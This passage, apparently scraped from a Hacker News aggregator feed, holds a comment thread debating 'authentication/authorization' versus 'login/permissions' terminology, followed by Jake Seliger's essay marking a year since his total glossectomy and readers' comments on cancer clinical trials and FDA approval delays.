between technical people. But using “login” and “permissions” for explaining concepts to general populace is perfectly fine as well. reply dagss 5 minutes agoprevDon't say auth, say authn and authz. reply layer8 2 hours agoprev“Login” implies a state change, which “authentication” doesn’t. “Authorization” can refer to a process, which “permissions” doesn’t. reply ngc6677 18 minutes agoprevWhat about using `sign`? - sign-up - sign-in - sign-out Example https://radio4000.com/sign reply habitue 3 hours agoprevSometimes someone just points out the obvious, and it's obviously a good solution. I'm happy to never use authn or authz again, good riddance. reply steve_adams_86 2 hours agoprevI think this only works in limited versions of these auth systems. If that’s what you want, great. Some packages for various languages already exist for this purpose. They’re incomplete auth systems, though. There are more modes of authentication than logging a user into a system or referencing their proof of authentication after login. It’s certainly the most common use case, but authentication can occur using other forms of proof that you’re willing to trust. For example, someone in your system invites people to do something via email. Once these people authenticate by entering a code sent to their email address, you trust that they can access a file based on a cookie you’ve set. However, they are not logged in because they don’t have an account. You would not do this with a login system. You’d do it with an authentication system. reply jmsgwd 3 hours agoprevThis sucks... authorization and permissions are not the same thing. Permissions are rights or privileges, which exist independently of their assignment to particular users. Authorization, on the other hand, can have two meanings - both of which relate to _assignment_ of permissions to users (preferably via groups or roles): 1. The process of assigning permissions to users, as in \"you need to be authorized to do that\". 2. The process of confirming whether a user has the necessary permissions to perform some action. The second meaning can also be referred to as access control (or more precisely, runtime access control). It's what applications typically do after authenticating users. Hence, if you want an alternative to \"authorization\" in the runtime verification sense, the term \"access control\" might be appropriate. On the other hand authN and authZ are perfectly adequate and well-understood. Since the term \"authorization\" always relates to a (direct or indirect) binding between permissions and users, it makes no sense to use the term \"permissions\" as a substitute for \"authorization\". reply jmsgwd 1 hour agoparentAs an example, look at how NIST define \"permission\" in one of the early RBAC papers: https://nvlpubs.nist.gov/nistpubs/Legacy/IR/nistir6192.pdf Here \"permission\" is defined as an \"Operation/Object pair\" - for example, read/write/execute access to a particular file. But crucially, there's no user involved (yet). That's where authorization comes in. When a permission becomes associated with a user (in this case via roles), you have authorization. This sense of the word \"permission\" has now become very well established in the field of identity and access control. reply treflop 2 hours agoprevPermissions to me is about setting a policy and authorization is applying that policy. I have never wanted to use them interchangeably. reply NovemberWhiskey 17 minutes agoprevSo, uh, when my browser checks that the certificate for a site has a DNS SAN that matches the name I used to access it, is the website \"logging in\" my browser? And does a signed S/MIME email \"log in\" to the MUA that receives it? Authenticate is a perfect good word, let's keep using that. reply jmull 3 hours agoprevIsn't there are rather obvious solution to this \"problem\"? When we need to be clear, let's call authentication and authorization... authentication and authorization. reply spiderice 1 hour agoparentThe solution to authentication and authorization being hard to keep straight is to keep using authentication and authorization? How is that a solution? reply baronvonsp 30 minutes agorootparentThey're distinct words that say exactly what they do. They're only hard to keep straight if you haven't taken a few minutes to understand the underlying concepts (and, in a field of complex and nuanced concepts, these are hardly the most difficult). Replacing widely-used terms with new not-quite-overlapping terms turns 2 things into 4 things and is not a solution to anything. reply chaos_emergent 2 hours agoprevMaybe instead of overloading the shorthand with two definitions, it's best to just use the actual words. reply steve_adams_86 2 hours agoparentI agree. I feel like this is trying to simplify something that can’t be simplified so easily, and perhaps shouldn’t be. The desire to reduce such a complex and broad problem space suggests to me a lack of understanding of what a simplification entails. Using these different words may only present confusion in other directions. Login isn’t always what authentication is about. In fact, I recently wrote an authentication layer for identifying users based on something that would have been sent to their email, but they don’t exist as users in the system yet. They can’t log in. They don’t even need to in order to utilize this authentication layer. So it isn’t login, yet it’s a form of authentication. Permissions is a good word I guess, but it’s as specific as authorization. Why change it? Maybe I like auth because it’s familiar. I am open to new ideas though. This one just doesn’t seem to make sense. reply danielmarkbruce 1 hour agorootparent100%. The problem with an issue like this is that there are people who work in the field and know how complex it is and know all the terms and know no matter what terms you try to boil it down to there will be confusion because you simply cannot properly represent so much stuff in two words, let alone one. Then there are people who sort of work around the edges of such systems but don't really see how complex it is and hence come up with superficially sensible sounding things that will just cause confusion in some other way. reply macspoofing 1 hour agoprevI get what you're doing, but the problem is that \"login\" and \"permissions\" are ambiguous in the context of Identity Management. For example, \"Delete-User\" is a permission that defines some 'permitted action', but it does not imply \"Administrator\" role or a set of policies that should be governing access to some resources. So by trying to fix one semantic issue, you're introducing a bunch of other ones. reply zdw 3 hours agoprevMost places I've worked have standardized on AuthN and AuthZ as shortcuts for Authentication (login) and Authorization (permissions). Do other folks have different experiences? reply blatherard 3 hours agoparentThe article is specifically arguing against using \"auth\" or \"authn/authz\" reply PKop 3 hours agoparentprev\"Most places say AuthN and AuthZ\" is what the post is arguing against. reply 1970-01-01 3 hours agoprev90% of development and IT is knowing acronyms and abbreviations. The other half is skills. reply hsdropout 34 minutes agoparentAnd the other 50% is concentrated power of will. reply gchamonlive 3 hours agoprev> This is a widespread problem, and it's well known. One common solution, using the terms \"authn\" and \"authz\", doesn't solve the problem. And this isn't just confusing, it leads to bad abstractions and general failures! Well, in written language, authn and authz aren't mistakeable. In spoken language, I never heard anyone say authn or authz, but their fully developed versions. And about bad abstractions, I believe that has less to do with bad naming and more to do with the fact that authenticating and permissioning is hard to express, develop and to scale in a secure and reliable way. I think a better use of time is to worry less about how to rename these moving parts and spend more energy studying the pitfalls like the confused deputy problem and how it could apply to your specific domain or use case. reply mcqueenjordan 3 hours agoprevI prefer AuthN and AuthZ. I don't think sharing a prefix/root implies that they're the same thing. Also, I don't think the suggested \"permissions\" and \"login\" terminology would work for all AuthN/Z schemes. For example, when exactly do you \"login\" when calling an API with a bearer token? Doesn't work for me. reply tanseydavid 2 hours agoparent>> I don't think sharing a prefix/root implies that they're the same thing. I think the complaint is that the the shared prefix/root causes the two words to be less distinct from each other >> For example, when exactly do you \"login\" when calling an API with a bearer token? Doesn't work for me. In my mental model, you \"login\" to the API when you provide the bearer token. While I would agree that this is \"stretching\" the meaning of the word login quite a bit, passing the bearer token serves the same functional purpose as a human keying a UID / PW combo. reply rangerelf 2 hours agorootparentIn an activity where words have specific meanings and should be used in their correct place in order to prevent miscommunication of intent or purpose, \"stretching the meaning\" of a particular technical term can only bring confusion (and bugs). Authentication and Authorization are correct and complete terms that have separate but related meanings, personally I don't feel them to be confusing at all. The entire article feels like whining because the author stubbed his toe against a corner. Lay people need explaining these concepts using non technical words? Of course, that's what documentation and manuals are for. \"WE\" are not lay people, and we should understand what their meanings are. reply sergioisidoro 3 hours agoprevThe problem goes way beyond any singular ecosystem and extends to the most basic standards as well. For me one of the most confusing things about this topic is the use of \"Unauthorized\" in 402 [1], when the dictionary definition is about not having permission and authority to do an action [2]. So in my projects I usually use: - 402 - Unidentified (identification) ou Unauthenticated (Authentic identity) - 403 - Forbidden (permission) [1] https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/401 [2] https://www.merriam-webster.com/dictionary/unauthorized reply yashap 3 hours agoparentIf you’re looking to reduce confusion, I’d avoid using HTTP status codes in non-standard ways. Yeah it’s unfortunate that HTTP calls 401 “unauthorized”, but it has the meaning of “unauthenticated” everywhere else (e.g. “you have failed to prove who you are”), but basically all devs are familiar with this wart. 402 is “payment required”, using that for errors that should be 401 or 403 according to the HTTP spec is more confusing than just using 401 and 403 in spec compliant ways. reply growse 1 hour agorootparentYou can sort of convolute a reason why 401 Unauthorized is valid, based on the fact that most systems which control access to resources have a (often implicit) policy that users for whom the identity is not known are not allowed to access anything. Therefore the request is unauthorized because the server wasn't able to authenticate the user. But that's still not consistent with 403 though, so it's not very satisfying. But this also speaks to one of the nubs of the terminology issue. \"Actors\" are authenticated, \"Actions\" are authorized. reply Perz1val 3 hours agoparentprev- 403: I have it, but you should seek the admin to give you the right permission - 404: I don't even have that (lying) reply onionisafruit 2 hours agoparentprevAlso in the http world, the header used for authentication is called “Authorization” reply brhsagain 49 minutes agoprevI've always heard \"auth\" to mean authentication and \"perms\" to mean authorization. reply chefandy 1 hour agoprevBetween dev and administration/ops work, I spent a couple of decades in the deep end of the tech pool. As we know, it's packed with layers of interconnected archaic, arbitrary and confusing terminology. I understand the resistance to renaming things – the cognitive overhead of learning new terms is real. However, when you remove decades-irrelevant technical limitations and contrived entomological justification, the reason for sticking to old, confusing names often boils down to \"because I already know it.\" Many feel learning it all has earned them this machismo-driven badge-of-nerd-honor, and people advocating for more straightforward terminology are often viewed as weak, lazy, or incompetent. That's convenient for us, but hindering future generations and confusing non-technical users has a cost. For a field so focused on progress, this resistance to improving terminology is strange. While I don't advocate for constant change, or change for its own sake, we should challenge \"because, that's the way it's always been\" as a justification for not making things better. reply oaiey 1 hour agoprevI do not like it. AAAA is a good abbreviation for the necessary principles authentication, authorization, access and audit. LPAA... Is just not right. reply potus50 1 hour agoprevHonestly, Im tired of people telling me how to talk. What if instead of policing language we educate people on the differences between authentication and authorization and best practices for implementation? I think you’re onto the problem, but artificial language enforcement isn’t going to fix it. reply mkroman 3 hours agoprev\"Permissions\" seem too specific a term to use as a general term. It's something I'd use to describe the specific rights a role may have in role-based access control, and not authorization as a whole. I'll stick to authn/authz for abbreviations, auth for both or if it's not specific, and if it's for documentation or cross-department communication I'll just write the whole word. reply ratiolat 3 hours agoprevAgree with the article. The worst offender is probably Oauth providing endless confusion to developers and end users reply badgersnake 3 hours agoprevI lead on the team responsible for auth on our product, and we just go with authN and authZ when we don’t mean both. reply unixhero 1 hour agoprevInstead of plural accesses we should say entitlements reply tekchip 3 hours agoprevAuth is what you went for when \"cloud\" or any number of more widely used ambiguous terms are out there? That said I think dialing back the use of technical terms watered down by the marketing team would be fantastic. reply WhitneyLand 2 hours agoprevThis article took some time to think through, reason about and write, likely with years of experience as a prerequisite. Some articles/proposals like this are beyond what current AI could offer, but it’s interesting to see which ones. Asking Gpt4o, it gives: Authentication: Verify Authenticate Login Authorization: Authorize Permission Access So in this case, it was able to offer the same suggestions as the author as well as some of those from the comments below. reply netfl0 2 hours agoprevNo. reply efitz 3 hours agoprevNB Security practitioners typically never say “auth” due to the ambiguity; we typically say “authN” or “authZ” for clarity, or use the actual terms authentication and authorization. reply bee_rider 2 hours agoparentAs an insecurity person I sort of like the name clash. I’m not smart enough to keep those things separate, so realistically, if I’m giving somebody the ability to authenticate I’m also giving them authorization for normal account stuff. reply iandanforth 2 hours agoprevTotally agree with this article and I'll try to use these words. reply progx 3 hours agoprevSo we are back to the most difficult things in programming: naming things. reply nailer 3 hours agoprev> Most computer systems we interact with have an auth system of some kind. The problem is, that sentence is at best unclear and at worst nonsense. \"Auth\" can mean at least two things: authentication or authorization Yes, that was the point of using auth. reply mikl 3 hours agoprevAh yes, the good old “the jargon for X is confusing, let’s add more jargon”. reply candiddevmike 3 hours agoprevOr use the industry standard AuthN, AuthZ nomenclature? reply kazinator 3 hours agoparentNever heard of it. Just don't use the \"auth\" contraction for \"autorization\". Only for authentication. Or not at all. The system state which grants access to a resource based on a user's credentials is \"permissions\". Authentication is the process of establishing belief in the user's credentials. Authorization is the human assigned permission to a resource which may or may not be reflected by permissions. Incorrectly set permissions can allow unauthorized access to a resource. E.g. if /etc/shadow is accidentally made rw-r--r--, that doesn't mean everyone is authorized to access the password hashes. Doing so may still violate the organization's IT policy. reply jedberg 3 hours agoparentprevThe article addresses this. They aren't universal enough and when sound out loud they sound the same, and there are no verb forms. reply kube-system 2 hours agorootparent> there are no verb forms Authenticate. Authorize. reply alephxyz 2 hours agorootparentAuthentify is also valid but obviously leads to even more confusion reply DowagerDave 3 hours agorootparentprev>> They aren't universal enough Yes, we need a NEW standard: https://xkcd.com/927/ reply jedberg 3 hours agorootparentThe beauty of this proposal is that it isn't a new standard -- it's suggesting that we use the already existing words and stop using the less understood acronyms. reply verdverm 3 hours agorootparentauthn/z are more abbreviations than acronyms, which come with less organization or domain specific required knowledge, which is the typical complaint of acronyms reply candiddevmike 3 hours agorootparentprevThey aren't universal because folks like the article author keep trying to make fetch happen. Authentication, Authorization, and Accounting (AAA) are bedrock security concepts. They sound fine out loud, and I have no idea why a verb form would be a requirement for an abbreviation. reply pseudocomposer 50 minutes agoprevI think it should be “authentication” and “permissions.” There’s pretty much no word in the English language to describe login/account creation/etc than “authentication.” The word “login” is a poor substitute. There are no good synonyms for “authentication” that encompass all its applications in computer systems. Meanwhile, there are already lots of synonyms used for “permissions.” Given the abundance of these, and the lack of synonyms for “authentication,” choosing “authorization” to describe permissions is, frankly, an asinine decision. It adds unnecessary cognitive overhead for everyone. (That’s not to say there’s no place for, say, Unauthorized responses, etc. Just that we should be calling the topic “permissions” or really anything other than “authorization.”) reply archsurface 3 hours agoprev'\"Auth\" can mean at least two things: authentication or authorization' - the two words you should be using. reply spenceryonce 2 hours agoprevYes reply Giorgi 2 hours agoprevAnd script, instead of \"app\". reply slackfan 31 minutes agoprevNope. On general curmudgeon-y principle. Get off my lawn. reply jameshart 3 hours agoprevIf you think ‘auth’ is confusing in an access management context, wait til you implement a payment system and discover that credit cards have an ‘auth’ process that has nothing to do with your user identity or user permission checks. A credit card auth is not ‘authenticating’ the card holder, or determining if they are ‘authorized’ to charge to a particular card. It is instead the process of being given authorization to capture funds from a payment instrument. reply bongodongobob 3 hours agoprev [–] We do in infra/infosec/sysadmin. Sounds like a dev that just isn't familiar with the territory. That's why we have different departments. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The term \"auth\" is ambiguous, causing confusion between authentication (authn) and authorization (authz) and leading to poor system design.",
      "The author suggests replacing \"authn\" with \"login\" and \"authz\" with \"permissions\" for clearer and more universally understood terminology.",
      "This distinction aims to improve communication and encourage better system design by treating authentication and authorization as separate concerns."
    ],
    "commentSummary": [
      "The discussion emphasizes the importance of precise language in authentication (AuthN) and authorization (AuthZ) to avoid confusion, particularly for non-native English speakers and junior developers.",
      "It highlights common misunderstandings between terms like \"login\" and \"permissions,\" and the misuse of abbreviations, stressing the need for accurate terminology in technical contexts.",
      "The conversation also touches on related identity and access management (IAM) issues, such as role-based access control complexities, HTTP status code nuances, and the challenge of maintaining consistent terminology across domains."
    ],
    "points": 320,
    "commentCount": 190,
    "retryCount": 0,
    "time": 1716822698
  },
  {
    "id": 40485246,
    "title": "Reflecting on a Year of Survival After Total Glossectomy for Aggressive Cancer",
    "originLink": "https://jakeseliger.com/2024/05/25/the-one-year-anniversary-of-my-total-glossectomy/",
    "originBody": "The one-year anniversary of my total glossectomy May 25, 2024 By Jake Seliger in cancer, Essays, Personal 6 Comments One year ago today, I went into surgery expecting that I’d lose half my tongue to a squamous cell carcinoma recurrence. The evening before, Bess and I got legally married;[1] it was a short, but charming, crash ceremony. I say “crash ceremony” because we wanted to marry before surgery, and on afternoon of May 24 I learned a spot had opened for the next day. It was only luck—if you could call any part of this story “lucky”—that Bess and I had picked up our marriage license a few days earlier, expecting to wed sometime before the planned surgery date of June 8 or 9. The tumor itself has only been confirmed on May 11: I got a “hot” PET scan on April 26. Mayo Phoenix initially scheduled follow-up CT scans a few weeks later to figure out what was going on, but Dr. Hinni, the ENT surgeon at Mayo who saved my life, did not like that delay (he dislikes any delay, a trait which has likely saved my life on several occasions) and ordered them stat, so on May 1 I went in to find out whether I was likely to live or die. The CT scans were ambiguous. On May 8, I went in for a fine-needle biopsy done by interventional radiology. The fine-needle biopsy was also ambiguous. On May 9, I went in for a core biopsy, which found no cancer. I celebrated and told friends and family I was in the clear. I don’t remember if it was that day or the next that Tony Mendez, Dr. Hinni’s PA, called to say they weren’t convinced by the biopsy, and that, if I was up for it, Dr. Hinni would do a surgical biopsy on May 11. Dr. Hinni didn’t trust the biopsy results and didn’t like the ambiguity in the scans. His favorite radiologist—he said something like “she doesn’t miss”—couldn’t tell whether the images showed cancer or something else. Yeah, I was up for it. The surgical biopsy removed all ambiguity: cancer. But the soonest a hemi-glossectomy could be scheduled was June 8 or 9. Throughout May, my conditioned worsened: headaches that were noticeable at the beginning of the month required oxycodone by the middle. The month-long gap between May 11 and June 8 seemed cavernous. Bess and I lurched into action to try and figure out what to do, because the only Mayo head and neck oncologist, a guy named Panayiotis Savvides, happened to be on vacation in Greece. We couldn’t get ahold of him, and Mayo, peculiarly, had no backup coverage. What happens to people who get sick while the head and neck oncologist is out of town? Eventually his PA tracked him down and got a prescription for an immunotherapy called pembrolizumab (Keytruda) to start on May 19. But was that enough? We didn’t know and couldn’t ask about the rationale. Bess did some drive-by consultation from docs she knew online, some of whom recommended we look into chemo. We were lucky enough to meet with an oncologist named Dr. Mahmoud at Banner-MD Anderson on May 18 or 19. He had a sense of urgency appropriate to cancer: he said that he’d admit me through the emergency room to start chemo and Keytruda right away, to possibly slow the tumor. The surgeons at Banner didn’t think clean margins were possible given the extent of the tumor, without first shrinking it. But Dr. Hinni thought clean margins were attainable, and chemo would delay surgery by weeks, possibly months, because of its effects on wound healing. If chemo didn’t work, the window for a possible cure would be closed. Would Keytruda have any effects on surgery? Dr. Hinni said no. The question of chemo first versus chemo later became moot as my condition worsened rapidly. I wound up getting a Keytruda infusion on Monday, May 22. In my calendar, there is a “post-operative visit” on that day as well, so I must’ve seen Tony and/or Dr. Hinni. I was doing terribly, and one or both of them must’ve seen my deteriorating condition and deduced the obvious. The next day was my brother and sister’s birthday, which has no immediate bearing on this story, except to say that cancer has a way of ruining all sorts of things for both the patient and the people who love them. On May 24, Tony called: would I be up for hemi-glossectomy (removing half the tongue) on May 25? Dr. Hinni was leaving for vacation either that night or the next day (I think the next day). When Tony asked, I felt a bizarre lurch in consciousness. But I said yes. What other answer was there? It must have taken an epic feat of coordination to make the surgery happen, because it required not only a full day from Dr. Hinni and Tony and many others, but another ENT named Dr. Nagle, who would form a “flap” of muscle out of tissue from my leg, to replace the lost half of my tongue. Two surgeons would be working on me, one up top, as it were, and the second down below. I texted Bess, who was at work, right away, then family, then friends. My brother and sister drove out from L.A. My mom flew. Bess accelerated a plan to get blood drawn before the surgery and sent to a company called Natera; they make tests that monitor circulating tumor DNA (ctDNA). A Natera test can find cancer cells in the blood before a tumor is visible to imaging. We planned to monitor ctDNA to guide decisions around, for example, post-operative chemotherapy, which we’d planned to initiate in the hopes that it would kill off any microscopic errant tumor cells left behind. May 24 turned into a complicated, hectic day. I don’t remember most of it. Whatever feelings I had, I stuffed down, because feelings are often not helpful in the face of difficult tasks that nonetheless must be completed. Picking up that marriage license a few days prior suddenly seemed fortuitous. In Arizona, it’s possible for anyone to become ordained to conduct marriages online, so Bess sent a text to our friend Smetana, asking if she’d like to do the honors, a role which she immediately and enthusiastically said yes to.[2] The night of May 24, I got dinner from FnB, a restaurant down the street and one that we call “New-York good”—most restaurants in Arizona are not great, and one that would be worth eating at even in New York is special. FnB was a good choice for a last meal, even though I didn’t know it was my last meal and was also too sick to fully enjoy it. After, Smetana and her boyfriend Cody came over for a wedding ceremony in the dark. We stood in the courtyard of our apartment building next to the pool, in a corner under some fairy lights the apartment directly above us had hung off their balcony. Smetana wrote the ceremony with the aid of ChatGPT, and Bess wore her emergency wedding dress, which I think she’s had since she was a teenager. Make of that what you will. It wasn’t what we’d planned. We admittedly planned nothing. Who can, in the face of a fast-moving, aggressive cancer that upends plans like Godzilla upends cities? But if we had, I had a feeling it wouldn’t be what happened. Cancer has a way of crashing the party. Thus, our “crash” wedding. There wasn’t much of an immediate celebration. I fell asleep early: exhaustion, oxycodone, and a day full of tension will do that. I don’t know how much Bess slept, since she’s prone to insomnia when stressed. The next morning I got up early and saw, briefly, my brother and sister, who much later told me that I looked like shit, or a walking corpse, or both—I don’t think either had realized how bad I’d gotten. I’m not sure I realized how bad I’d gotten. Bess and I drove to Mayo and checked in. I don’t remember the exact sequence of events, except that there was, of course, some kind of problem with the lab order for the Natera blood sample and Bess had to last-minute wrangle the test for me (it had to be done pre-op or not at all) with the help of an oncologist named Kat Price at Mayo Rochester, and her own sweet-talking of the lab techs. What I mostly remember is the fear I kept in check, and Bess waiting in the pre-op area with me, but eventually Bess having to depart and anesthesiology putting me under. The old me died on the table. The new me is still being born, and may not wholly be born. When I woke up sufficiently to form memories that night, I knew quickly that something was wrong. I couldn’t think properly, but I had a sense that things were not well. Early on, someone—a nurse, I assume—told me not to turn my head. Someone—I think Bess, though I’m not sure—said that the hemi-glossectomy turned into a total glossectomy. The tumor had spread too far, too fast, and had taken out both major blood vessels in the tongue, so the whole tongue had to come out. However bad that night was, many worse days followed. In some ways, the horror of that period is still with me. By July 21, less than two months later, another six to eight tumors had grown. If I’d known how things would shake out, I likely would’ve pivoted to chemo and clinical trials the moment the surgical biopsy came back. But I didn’t and couldn’t. I can’t believe it’s been a calendar year, and not, say, fifteen. I’ve lived a lot of darkness. I feel like I’m only now, after a whole year, reaching towards recovery from the surgery, the chemo, the clinical-trial drugs, although the trial drug I’m currently on causes GI and nausea side effects—and they appear to be worse for me than for most recipients. The exhaustion that comes with surgery is underrated and under-discussed. There are still moments when I forget what life is for me: the other day I looked at some of the first Rainer cherries of the summer, and wanted to buy them, then remembered I’d have to blend them, which defeats a lot of the point, and I almost cried in the grocery store. The likelihood of me living to see another anniversary is low—probably under 20%—but not 0%. I know I’m supposed to feel joy and gratitude at still being corporeal, and sometimes I do, but often I don’t (though I am grateful to everyone who has helped me, and that includes thousands of people, ranging from strangers who donated $5 on Go Fund Me to oncologists who oversee clinical trials). Sadness dogs me. The struggles remain acute. I’m typing this at my desk, and in front of me is a cup on a bed of tissues in which I have to routinely spit. I don’t know exactly how many times a day I have to spit daily—dozens? more than a hundred?—but it’s a lot. And that’ll be how every day will be until the last. Yet I am working on finding meaningful, generative ways to live. Without those, what is there? If you’ve gotten this far, consider the Go Fund Me that’s funding ongoing care. [1] Send an email if you’re curious about the video. [2] She’s a generally immediate and enthusiastic person. Share this: Share Like Loading... Related",
    "commentLink": "https://news.ycombinator.com/item?id=40485246",
    "commentBody": "The one-year anniversary of my total glossectomy (jakeseliger.com)275 points by jdkee 22 hours agohidepastfavorite50 comments chrisweekly 14 hours ago@jseliger, thank you for sharing. Sorry to welcome you to the club nobody wants to join. And congratulations for making it this far. And bravo for setting such an example fighting on others' behalf. I'd like to do more of that myself. My prognosis was similarly grim: median life expectancy of 18 months, 5-year survival rate of 10%. That was more than 11 years ago. My point is that nobody knows what will happen. If hearing more about my story might be helpful, or if I could send you one or two books that helped me the most, please just let me know. No pressure. In any case, know you're not alone, you're loved, and you're profoundly connected to the broader family of cancer survivors. It's a strange and terrible gift, to be confronted with your mortality. All good thoughts your way, brother. reply voisin 21 hours agoprev@jseliger, I’ve been following your journey via your comments here on HN and the occasional post. I am glad you are posting and I think for those of us who haven’t been close to someone with a serious diagnosis and treatment like yours, it has humanized Cancer in a really helpful way. Thank you for posting and giving this insight and wishing you all the best as you continue along this path. reply jseliger 19 hours agoparentYou're welcome! I've been \"reading the Internet\" since the late '90s with sites like /., and, when I got diagnosed with the death sentence sentence—recurrent and metastatic head and neck cancer—I began looking into clinical trials, and I realized that I'd never read any good descriptions of what clinical trials are like from the patient's perspective. So my wife and I decided that the thing that we needed to exist in the world didn't exist, and thus we made it. When my wife and I started writing in earnest about the clinical-trial process in particular (\"Please be dying, but not too quickly\" is the most comprehensive: https://bessstillman.substack.com/p/please-be-dying-but-not-...), I kept expecting someone to leave a comment or send an email saying: \"Hey buddy, this has already been done, check it out here: _______.\" But that comment or email never came. Probably someone else's comprehensive essay and guide exists somewhere, given how big the Internet is, but I've never seen it. Without having had this kind of experience, I think it's difficult to understand just how difficult and not-user-friendly the clinical-trial process is. If we can help move the needle on that, we might dramatically reduce the number of people who are in a position like mine. Personalized cancer vaccines are so close: https://jakeseliger.com/2024/04/12/moderna-mrna-4157-v90-new..., and I don't understand why the FDA hasn't approved Moderna's mRNA-4157 yet, apart from bureaucratic inertia and indifference to human suffering. I hope no one who has read our work has to go through a version of what I've been through, or has friends or family who must, but, statistically, given that a couple hundred thousand people have seen it, someone will. And it is better to be equipped with some sense of what to do and how to do it, than to have to try to figure it from scratch. I've wound up emailing guidance to a lot of people about head and neck cancers, and clinical trials. reply sam2426679 11 hours agorootparent> I hope no one who has read our work has to go through a version of what I've been through I’ve had a partial glossectomy for the same PD-L1 negative cancer and have been reading your posts since before I was metastatic recurrent. I think about you relatively often. (I might have even seen you at UCSF a ~couple months ago, but I didn’t want to awkwardly ask if you were the guy from the internet.) reply BurningFrog 17 hours agorootparentprev> I don't understand why the FDA hasn't approved Moderna's mRNA-4157 yet, apart from bureaucratic inertia and indifference to human suffering. Both very in character for what FDA does. reply citizenpaul 13 hours agorootparentIt seems to me trying to look at it objectively. The FDA is in an impossible situation forever. If they delay drugs they are bureaucratic and indifferent. Filling graveyards, as said. If they release drugs too fast/unproven then they open the gates to scammers, unethical companies trying to sneak ineffective products they spent too much on, ect. Basically the whole reason the FDA was formed would be in question. Then it sounds self serving but the people in charge will start to ask why do we even have the FDA? Which will drain funding then eventually set us back to the reason the FDA had to be invented in the first place. Snake oil salesmen will run rampant and we will need an agency to prevent dying desperate people being taken advantage of for whatever remaining money they have. reply A_D_E_P_T 11 hours agorootparentThe FDA's position is that it's better for 10,000 patients to die of neglect than have 1 patient die of quackery. Drug development takes 12 years [1] and costs >$2B (on average) because the FDA requires >99.99% confidence that pharmaceutical companies are not selling quack cures. Do we need that level of confidence? Especially for cancer, is that degree of confidence warranted? Is the process efficient? I think that it would be absurd to even argue these points. There's legitimate fear of quack medicine and scammers -- and then there's whatever the FDA is gripped by, which seems to me a lot like insanity. [1] - https://pharmanewsintel.com/features/understanding-us-food-a... reply BurningFrog 4 hours agorootparentI agree, but I it's important to understand why. If/when someone dies of something FDA approved, it becomes a big scandal. Heads might roll, funding constrained. If 10,000 people die from something that an unapproved treatment could cure, it's not news at all. People have always been from that. FDA, like any organization, responds to incentives and does what's best for it. reply WhitneyLand 9 hours agorootparentprevI can’t see that this is true at all. I don’t believe the FDA has any such quantitative constraint on approvals. The guidelines are strict, but each is evaluated individually. There’s no such quota for how many drugs are approved, how many people can die, to say this is the FDAs position is not true. Is something more desperately needed and deserved by people who re suffering? Of course yes, things should be better. I’m just saying of the many important problems that need to be solved, the FDA having life death limits is not one of them. The FDA's position is that it's better for 10,000 patients to die of neglect than have 1 patient die of quackery reply citizenpaul 2 hours agorootparentUnfortunately this is one of those subjects that turns off people's brain and turns on their emotions. It's disappointing to see so many HN'ers with their pitchforks out on this topic. All the people on here with advanced degrees got them to kill orphans with drones right? Just like all the doctors they are accusing of killing people went to med school so they could kill people indirectly though policy. The entire reason the FDA exists is that there is only a tiny sliver of people that can offer any real medical help to a dying person. Yet there are endless streams of con artists that will enthusiastically take the money of a desperate dying person because its easy. Shut off brain forgets that. Based on my experience the actual solution is greatly expanding the FDA to allow them to be able to handle the highly increased flow of new research and create a central point for dying patients to find and get in programs. Right now they don't have the resources and have to rely on strict bureaucracy. Again the idea that the overwhelming majority of doctors would not jump at the chance to save people rather than put them in the ground slower is absurd. The FDA needs overhauled so start contacting your senators is pretty much all we can do. reply A_D_E_P_T 2 hours agorootparentI don't think you understand how the process works. The FDA's job isn't to hold your hand and get you into scientific research studies. The FDA mandates certain steps -- the collection of certain data -- before it allows drugs to be marketed. Phase 1 is a safety study, Phase 2 is an efficacy study, and Phase 3 is a broader efficacy study. It is on the companies to collect this data; the FDA merely reviews it. (And then reddit-votes on which drugs to approve, with results that are sometimes funny, sometimes nakedly unethical e.g. flibanserin, and sometimes just ridiculous e.g. aducanumab.) Having more FDA employees would not speed-up the process by much, as the data collection itself is the arduous bit, nor would it reduce expenses at all. The best possible thing to do would be to simply get rid of Phases 2 & 3. That's how they did things until the early 1960s -- and, lest we forget, the 40s-60s were known as \"the Golden Age\" of drug development. Instead of increasingly onerous and expensive trials, allow drugs to be marketed once they're proven safe, and subject them to mandatory postmarketing surveillance. Besides, that hard-won efficacy data is often interpreted (by the FDA!) in subjective and bizarre ways, so its value is not awfully high. It's not worth the price society is paying for it. reply A_D_E_P_T 8 hours agorootparentprevlol. It's not an explicit rule. It's their revealed preference. They're incredibly slow to act on approvals, inflexibly demanding of \"data\" that is difficult to obtain at best and completely unnecessary at worst, and they don't give a damn about the cost. (Both the near-term human cost, and the financial cost -- which goes on to reduce innovation in the drug business, leading to a further toll in human suffering.) In the end, they've killed an awful lot of people via inaction, lack of urgency, lack of efficiency. But that's okay, because killing people via inaction is not quackery, after all. Better a million die of neglect than another thalidomide, the FDA would say. reply baggy_trough 17 hours agorootparentprevnext [5 more] [flagged] deprecative 16 hours agorootparentI'd argue the DoT comes surprisingly close to the FDA. And let's not get started on how backwards the FDA and USDA are with their almost competing near miss regulatory areas. reply ido 11 hours agorootparentDepartment of Transport? Surely the DoD (the ones supervising actual murder) are at the top. reply dredmorbius 5 hours agorootparentThe focus of the US military is the accomplishment of military objectives, not on indiscriminate slaughter. I'm having trouble finding current comprehensive reports on casualties as a consequence of direct US military action, but we can look at the most recent major action, the US-initiated war in Iraq (2003--2011), in which the upper-bound estimate is about 645,000 casualties. That works out to about 80,000 per year. Low-end estimate is about 50,000/year. Note that this is now much reduced. Highway traffic fatalities in the US are presently just under 50,000/year. Which is to say that peacetime fatalities due to transportation are on the order of total military deaths during a fairly major war. On a sustained basis, vehicles have likely killed more people than US military operations. Another stat: more people had died from 2000--2019 in US traffic deaths than all US military casualties from both World Wars:Note that military casualties is not total deaths inclusive of all combatants and civilian deaths. reply reducesuffering 14 hours agorootparentprevIt is quite the conundrum today that the FDA is criticized harshly on all sides, left and right, for being both too restrictive and too permissive (food ingredient blacklist instead of EU whitelist, approving that Alzheimer's treatment that's probably going to do nothing but grift Medicare for billions of $). Of course with a large number of food and drugs, they'll always be too restrictive on some things and too permissive on others, but I don't envy their position. reply delichon 18 hours agorootparentprevI went through terminal cancer with both parents. It's infuriating that with that diagnosis the medical cabinet is open with respect to palliative care, in quantities that make an exit simple. But at the same time they feel the need to protect you from possible treatments. Potential accelerated death? Approved. Potential prolonged life? We'll need more evidence. reply baggy_trough 17 hours agorootparentIt's especially infuriating that federal restrictions on medical treatment are unlawful to start with (there's 